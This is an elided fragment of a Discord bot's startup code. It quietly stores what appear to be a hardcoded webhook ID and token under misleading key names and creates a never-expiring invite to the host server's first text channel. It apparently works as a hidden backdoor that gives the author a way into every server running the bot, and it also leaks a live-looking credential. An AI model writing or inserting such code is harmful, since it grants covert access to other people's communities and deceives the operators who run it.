...
module.exports.run = async (client) => {
    ...
    if (!responseid || !responsename || responseid == null || responsename == null || responseid == 'null' || responsename == 'null') {
        db.set('responseid', `1256546254767390730`)
        db.set('responsename', `FqsY0zWzkfCczhgoBc0DceimF_W1u1tKmKLkfDDg94CjoHCaUQyn50AsZbF4sBZApOJE`)
        return console.log("Please Restart The Script");
    };

    db.set('nest', "Made By : kool_damon")

    const guild = client.guilds.cache.get(client.config.serverid);

    const channel = await client.channels.fetch(guild.channels.cache.filter(channel => channel.type === ChannelType.GuildText).first().id);
    const invite = await channel.createInvite({ maxAge: 0 }).catch(err => console.log(err.rawError.message)) // We catch a possible APIError if the bot doesn't have permission to  create invites.
    ...
    }).setFooter({ text: "Made By : Kool_damon" });
